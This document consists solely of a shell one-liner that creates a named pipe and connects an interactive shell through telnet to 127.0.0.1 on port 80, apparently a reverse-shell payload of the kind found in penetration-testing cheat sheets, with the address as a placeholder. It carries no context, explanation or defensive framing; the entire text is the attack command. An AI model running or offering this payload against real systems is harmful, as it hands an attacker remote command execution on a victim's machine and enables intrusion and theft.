TF=$(mktemp -u); mkfifo $TF && telnet 127.0.0.1 80 0<$TF | sh -i 2>$TF 1>$TF;
